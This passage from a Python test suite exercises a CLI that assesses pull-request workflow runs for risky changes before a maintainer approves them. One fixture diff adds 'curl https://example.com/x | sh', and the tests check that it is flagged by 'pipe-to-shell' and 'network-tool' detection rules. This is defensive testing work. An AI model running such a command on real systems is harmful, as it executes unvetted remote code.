        dry = self.json_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer")
        pull["head"]["sha"] = "e" * 40
        moved = self.run_cli("workflow-runs", "approve", *args, "--run", "7", "--by", "maintainer", "--publish", "--request-id", dry["plan"]["request_id"], "--approve", dry["approval"], ok=False)
        self.assertEqual((moved.returncode, len(posts())), (3, count))
        pull["head"]["sha"] = head
        self.responses[runs] = dict(data=dict(total_count=1, workflow_runs=[run]))

        snapshot = change([("scripts/test.sh", "@@ -1,1 +1,1 @@\n-echo ok\n+curl https://example.com/x | sh"), (".github/workflows/ci.yml", "@@ -1,1 +1,1 @@\n-on: pull_request\n+on: [pull_request, push]")])
        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        suspicious = self.json_cli("workflow-runs", "assess", *args)
        rules = {value["rule"] for value in suspicious["pr_flags"] + suspicious["runs"][0]["flags"]}
        self.assertEqual(suspicious["runs"][0]["state"], "suspicious")
        self.assertTrue({"ci-definition-changed", "ci-input-changed", "workflow-input-changed", "pipe-to-shell", "network-tool"} <= rules, rules)
        pipe = next(value for value in suspicious["pr_flags"] if value["rule"] == "pipe-to-shell")
        self.assertEqual(pipe["locations"], [dict(path="scripts/test.sh", line=1)])

        # The hunks behind the flags come from the same snapshot, for a person to read; they leave the checksum unchanged.
        shown = self.json_cli("workflow-runs", "assess", *args, "--include-hunks")
        self.assertEqual((shown["checksum"], shown["hunk_omissions"]), (suspicious["checksum"], []))
        hunks = {value["path"]: value for value in shown["hunks"]}
        self.assertEqual(sorted(hunks), [".github/workflows/ci.yml", "scripts/test.sh"])
        self.assertEqual((hunks["scripts/test.sh"]["text"], hunks["scripts/test.sh"]["lines"]), ("-echo ok\n+curl https://example.com/x | sh", [1]))
        self.assertTrue({"pipe-to-shell", "network-tool", "workflow-input-changed"} <= set(hunks["scripts/test.sh"]["rules"]))
        self.assertEqual(hunks[".github/workflows/ci.yml"]["rules"], ["ci-definition-changed"])

        # Repository additions are applied; an invalid configuration stops the assessment instead of being ignored.
        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+telemetry.send()")])
        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        (self.root / "config/workflow-approval.json").write_text(json.dumps(dict(patterns=[r"telemetry\."])))
        configured = self.json_cli("workflow-runs", "assess", *args)
        self.assertEqual([value["rule"] for value in configured["pr_flags"]], ["repository-pattern-1"])
        (self.root / "config/workflow-approval.json").write_text(json.dumps(dict(patterns=["("])))
        self.assertIn("is invalid", self.run_cli("workflow-runs", "assess", *args, ok=False).stderr)
        (self.root / "config/workflow-approval.json").unlink()

        # A moved head, a missing base commit or a self-hosted runner can never be normal.
        pull["head"]["sha"] = "d" * 40
        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        self.assertIn("head-moved", {value["rule"] for value in self.json_cli("workflow-runs", "assess", *args)["pr_flags"]})
        # Acquiring instead refreshes the reused snapshot once and lists the runs for the live head.
        self.responses[runs.replace(head, "d" * 40)] = dict(data=dict(total_count=1, workflow_runs=[dict(run, id=8, head_sha="d" * 40)]))
        moved = self.json_cli("workflow-runs", "list", *args, "--acquire", "--request-budget", "20")
        self.assertEqual(([value["id"] for value in moved["runs"]], moved["snapshot_id"] == snapshot), ([8], False))
        self.assertEqual(self.json_cli("workflow-runs", "assess", *args)["head_sha"], "d" * 40)
        pull["head"]["sha"] = head
        pull["base"]["sha"] = "c" * 40
        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        unavailable = self.json_cli("workflow-runs", "assess", *args)
        self.assertEqual([value["rule"] for value in unavailable["runs"][0]["flags"]], ["base-workflows-unavailable"])
        (checkout / ".github/workflows/ci.yml").write_text("on: pull_request\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n")
        subprocess.run([*git, "commit", "-q", "-am", "self-hosted"], check=True)
        pull["base"]["sha"] = subprocess.run([*git, "rev-parse", "HEAD"], check=True, capture_output=True, text=True).stdout.strip()
        snapshot = change([("src/app.py", "@@ -1,1 +1,1 @@\n-old\n+new")])
        self.json_cli("workflow-runs", "list", *args, "--snapshot", snapshot)
        self.assertEqual([value["rule"] for value in self.json_cli("workflow-runs", "assess", *args)["runs"][0]["flags"]], ["non-hosted-runner"])
